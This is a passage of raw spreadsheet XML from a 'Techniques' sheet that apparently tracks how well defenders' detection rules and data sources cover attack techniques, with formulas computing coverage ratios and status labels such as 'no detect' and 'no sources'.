        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P301" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S30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01" t="s">
        <v>368</v>
      </c>
      <c r="U301" t="s">
        <v>1559</v>
      </c>
      <c r="V301" t="s">
        <v>1560</v>
      </c>
      <c r="W301" t="b">
        <v>1</v>
      </c>
      <c r="X301" t="s">
        <v>1553</v>
      </c>
    </row>
    <row r="302" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A302" t="s">
        <v>1553</v>
      </c>
      <c r="B302" t="s">
        <v>1561</v>
      </c>
      <c r="C302" t="s">
        <v>1562</v>
      </c>
      <c r="D302" t="s">
        <v>13</v>
      </c>
      <c r="E302" t="s">
        <v>1554</v>
      </c>
      <c r="F302" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G302" s="9" cm="1">
        <f t="array" ref="G302">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H302" s="9" t="str" cm="1">
        <f t="array" ref="H302">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I302" s="9" t="str" cm="1">
        <f t="array" ref="I302">IF(SUM(IF($C302=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C302=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J302" s="9" t="str" cm="1">
        <f t="array" ref="J30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02" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M302" s="9" cm="1">
        <f t="array" ref="M302">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N302" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O302" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P302" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S30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02" t="s">
        <v>485</v>
      </c>
      <c r="U302" t="s">
        <v>1563</v>
      </c>
      <c r="V302" t="s">
        <v>1564</v>
      </c>
      <c r="W302" t="b">
        <v>1</v>
      </c>
      <c r="X302" t="s">
        <v>1553</v>
      </c>
    </row>
    <row r="303" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A303" t="s">
        <v>1565</v>
      </c>
      <c r="B303" t="s">
        <v>1565</v>
      </c>
      <c r="C303" t="s">
        <v>124</v>
      </c>
      <c r="D303" t="s">
        <v>13</v>
      </c>
      <c r="E303" t="s">
        <v>1566</v>
      </c>
      <c r="F303" s="9">
        <f t="shared" si="4"/>
        <v>1</v>
      </c>
      <c r="G303" s="9" cm="1">
        <f t="array" ref="G303">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H303" s="9" cm="1">
        <f t="array" ref="H303">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I303" s="9" t="str" cm="1">
        <f t="array" ref="I303">IF(SUM(IF($C303=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C303=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J303" s="9" t="str" cm="1">
        <f t="array" ref="J30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03" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M303" s="9" cm="1">
        <f t="array" ref="M303">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N303" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O303" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P303" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S30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03" t="s">
        <v>425</v>
      </c>
      <c r="U303" t="s">
        <v>1567</v>
      </c>
      <c r="V303" t="s">
        <v>1568</v>
      </c>
      <c r="W303" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="304" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A304" t="s">
        <v>1569</v>
      </c>
      <c r="B304" t="s">
        <v>1569</v>
      </c>
      <c r="C304" t="s">
        <v>150</v>
      </c>
      <c r="D304" t="s">
        <v>13</v>
      </c>
      <c r="E304" t="s">
        <v>1570</v>
      </c>
      <c r="F304" s="9">
        <f t="shared" si="4"/>
        <v>9</v>
      </c>
      <c r="G304" s="9" cm="1">
        <f t="array" ref="G304">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H304" s="9" cm="1">
        <f t="array" ref="H304">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I304" s="9" t="str" cm="1">
        <f t="array" ref="I304">IF(SUM(IF($C304=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C304=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J304" s="9" cm="1">
        <f t="array" ref="J30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304" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M304" s="9" cm="1">
        <f t="array" ref="M304">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N304" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O304" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P304" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S30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04" t="s">
        <v>1571</v>
      </c>
      <c r="U304" t="s">
        <v>1572</v>
      </c>
      <c r="V304" t="s">
        <v>1573</v>
      </c>
      <c r="W304" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="305" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A305" t="s">
        <v>1569</v>
      </c>
      <c r="B305" t="s">
        <v>1574</v>
      </c>
      <c r="C305" t="s">
        <v>1575</v>
      </c>
      <c r="D305" t="s">
        <v>13</v>
      </c>
      <c r="E305" t="s">
        <v>1576</v>
      </c>
      <c r="F305" s="9">
        <f t="shared" si="4"/>
        <v>7</v>
      </c>
      <c r="G305" s="9" cm="1">
        <f t="array" ref="G305">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H305" s="9" t="str" cm="1">
        <f t="array" ref="H305">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I305" s="9" t="str" cm="1">
        <f t="array" ref="I305">IF(SUM(IF($C305=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C305=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J305" s="9" t="str" cm="1">
        <f t="array" ref="J30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05" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M305" s="9" cm="1">
        <f t="array" ref="M305">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N305" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O305" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P305" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S30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05" t="s">
        <v>1334</v>
      </c>
      <c r="U305" t="s">
        <v>1577</v>
      </c>
      <c r="W305" t="b">
        <v>1</v>
      </c>
      <c r="X305" t="s">
        <v>1569</v>
      </c>
    </row>
    <row r="306" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A306" t="s">
        <v>1569</v>
      </c>
      <c r="B306" t="s">
        <v>1578</v>
      </c>
      <c r="C306" t="s">
        <v>1579</v>
      </c>
      <c r="D306" t="s">
        <v>13</v>
      </c>
      <c r="E306" t="s">
        <v>1580</v>
      </c>
      <c r="F306" s="9">
        <f t="shared" si="4"/>
        <v>6</v>
      </c>
      <c r="G306" s="9" cm="1">
        <f t="array" ref="G306">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H306" s="9" t="str" cm="1">
        <f t="array" ref="H306">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I306" s="9" t="str" cm="1">
        <f t="array" ref="I306">IF(SUM(IF($C306=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C306=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J306" s="9" t="str" cm="1">
        <f t="array" ref="J30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06" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M306" s="9" cm="1">
        <f t="array" ref="M306">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N306" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O306" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P306" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S30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06" t="s">
        <v>1334</v>
      </c>
      <c r="U306" t="s">
        <v>1581</v>
      </c>
      <c r="W306" t="b">
        <v>1</v>
      </c>
      <c r="X306" t="s">
        <v>1569</v>
      </c>
    </row>
    <row r="307" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A307" t="s">
        <v>1569</v>
      </c>
      <c r="B307" t="s">
        <v>1582</v>
      </c>
      <c r="C307" t="s">
        <v>1583</v>
      </c>
      <c r="D307" t="s">
        <v>13</v>
      </c>
      <c r="E307" t="s">
        <v>549</v>
      </c>
      <c r="F307" s="9">
        <f t="shared" si="4"/>
        <v>1</v>
      </c>
      <c r="G307" s="9" cm="1">
        <f t="array" ref="G307">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H307" s="9" t="str" cm="1">
        <f t="array" ref="H307">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I307" s="9" t="str" cm="1">
        <f t="array" ref="I307">IF(SUM(IF($C307=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C307=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J307" s="9" t="str" cm="1">
        <f t="array" ref="J30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07" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M307" s="9" cm="1">
        <f t="array" ref="M307">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N307" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O307" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P307" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S30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07" t="s">
        <v>1386</v>
      </c>
      <c r="U307" t="s">
        <v>1584</v>
      </c>
      <c r="W307" t="b">
        <v>1</v>
      </c>
      <c r="X307" t="s">
        <v>1569</v>
      </c>
    </row>
    <row r="308" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A308" t="s">
        <v>1569</v>
      </c>
      <c r="B308" t="s">
        <v>1585</v>
      </c>
      <c r="C308" t="s">
        <v>1586</v>
      </c>
      <c r="D308" t="s">
        <v>13</v>
      </c>
      <c r="E308" t="s">
        <v>1587</v>
      </c>
      <c r="F308" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G308" s="9" cm="1">
        <f t="array" ref="G308">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H308" s="9" t="str" cm="1">
        <f t="array" ref="H308">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I308" s="9" t="str" cm="1">
        <f t="array" ref="I308">IF(SUM(IF($C308=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C308=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J308" s="9" t="str" cm="1">
        <f t="array" ref="J30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08" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M308" s="9" cm="1">
        <f t="array" ref="M308">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N308" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O308" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P308" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S30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08" t="s">
        <v>1386</v>
      </c>
      <c r="U308" t="s">
        <v>1588</v>
      </c>
      <c r="W308" t="b">
        <v>1</v>
      </c>
      <c r="X308" t="s">
        <v>1569</v>
      </c>
    </row>
    <row r="309" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A309" t="s">
        <v>1589</v>
      </c>
      <c r="B309" t="s">
        <v>1589</v>
      </c>
      <c r="C309" t="s">
        <v>208</v>
      </c>
      <c r="D309" t="s">
        <v>1590</v>
      </c>
      <c r="E309" t="s">
        <v>434</v>
      </c>
      <c r="F309" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G309" s="9" cm="1">
        <f t="array" ref="G309">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H309" s="9" cm="1">
        <f t="array" ref="H309">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I309" s="9" t="str" cm="1">
        <f t="array" ref="I309">IF(SUM(IF($C309=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C309=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J309" s="9" cm="1">
        <f t="array" ref="J30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309" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M309" s="9" cm="1">
        <f t="array" ref="M309">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N309" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O309" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P309" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S30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09" t="s">
        <v>368</v>
      </c>
      <c r="U309" t="s">
        <v>1591</v>
      </c>
      <c r="V309" t="s">
        <v>1592</v>
      </c>
      <c r="W309" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="310" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A310" t="s">
        <v>1589</v>
      </c>
      <c r="B310" t="s">
        <v>1593</v>
      </c>
      <c r="C310" t="s">
        <v>1594</v>
      </c>
      <c r="D310" t="s">
        <v>1590</v>
      </c>
      <c r="E310" t="s">
        <v>434</v>
      </c>
      <c r="F310" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G310" s="9" cm="1">
        <f t="array" ref="G310">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H310" s="9" t="str" cm="1">
        <f t="array" ref="H310">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I310" s="9" t="str" cm="1">
        <f t="array" ref="I310">IF(SUM(IF($C310=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C310=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J310" s="9" t="str" cm="1">
        <f t="array" ref="J31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10" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M310" s="9" cm="1">
        <f t="array" ref="M310">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N310" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O310" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P310" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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10" t="s">
        <v>368</v>
      </c>
      <c r="U310" t="s">
        <v>1595</v>
      </c>
      <c r="V310" t="s">
        <v>1596</v>
      </c>
      <c r="W310" t="b">
        <v>1</v>
      </c>
      <c r="X310" t="s">
        <v>1589</v>
      </c>
    </row>
    <row r="311" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A311" t="s">
        <v>1589</v>
      </c>
      <c r="B311" t="s">
        <v>1597</v>
      </c>
      <c r="C311" t="s">
        <v>1598</v>
      </c>
      <c r="D311" t="s">
        <v>1590</v>
      </c>
      <c r="E311" t="s">
        <v>434</v>
      </c>
      <c r="F311" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G311" s="9" cm="1">
        <f t="array" ref="G311">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
